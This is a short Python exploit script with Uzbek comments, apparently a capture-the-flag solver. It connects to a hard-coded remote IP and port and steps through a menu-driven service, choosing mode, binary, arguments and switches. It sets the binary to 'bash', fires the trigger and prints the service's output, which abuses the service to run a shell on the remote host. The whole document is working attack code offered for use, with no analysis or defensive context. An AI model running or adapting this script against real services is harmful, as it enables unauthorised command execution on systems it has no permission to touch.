import socket
import time

HOST = "154.57.164.81"   # remote bo‘lsa o‘zgartirasan
PORT = 30415          # portni moslashtir

def recv_until(sock, delim=b"> "):
    data = b""
    while delim not in data:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data

def sendline(sock, data):
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + b"\n")

def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    # banner skip
    print(recv_until(s).decode(errors="ignore"))

    # 1. mode
    sendline(s, "1")
    time.sleep(0.2)
    recv_until(s)
    sendline(s, "1")

    # 2. bin
    time.sleep(0.2)
    sendline(s, "2")
    recv_until(s)
    sendline(s, "bash")   # yoki sh, ls va hokazo

    # 3. args
    time.sleep(0.2)
    sendline(s, "3")
    recv_until(s)
    sendline(s, "a,b")

    # 4. switches
    time.sleep(0.2)
    sendline(s, "4")
    recv_until(s)
    sendline(s, "c,d")

    # 5. trigger
    time.sleep(0.2)
    sendline(s, "5")

    # natijani olish
    time.sleep(0.5)
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            print(data.decode(errors="ignore"), end="")
    except:
        pass

    s.close()

if __name__ == "__main__":
    main()
